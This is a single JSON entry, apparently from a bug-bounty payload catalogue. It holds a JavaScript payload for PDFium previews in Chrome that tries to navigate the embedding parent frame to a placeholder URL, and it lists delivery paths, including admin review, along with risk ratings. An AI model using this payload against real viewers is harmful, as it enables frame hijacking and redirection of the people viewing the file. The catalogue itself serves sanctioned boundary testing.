    {
      "id": "chrome_boundary_parent_nav",
      "category": "dom_access",
      "browser": "chrome",
      "technique": "parent_navigation_boundary",
      "payload": "(function(){var base='{url}';var sep=base.indexOf('?')===-1?'?':'&';try{if(window.parent&&window.parent!==window){window.parent.location=base+sep+'probe=chrome-parent-nav';}}catch(e){}})();",
      "description": "Validation-first parent-frame navigation probe for inline or embedded PDFium previews.",
      "risk_level": "high",
      "research_tier": "validation",
      "stability": "high",
      "expected_signal": "controlled_navigation_callback",
      "bug_bounty_value": "high",
      "method_family": "viewer_boundary_probe",
      "boundary_target": "viewer_to_parent",
      "blind_channels": [
        "navigation"
      ],
      "validation_stage": "boundary_validation",
      "signal_strength": "high",
      "delivery_paths": [
        "inline_preview",
        "admin_review",
        "embedded_viewer"
      ],
      "preconditions": [
        "PDF is rendered with a parent browsing context"
      ],
      "evidence_level": "medium"
    },
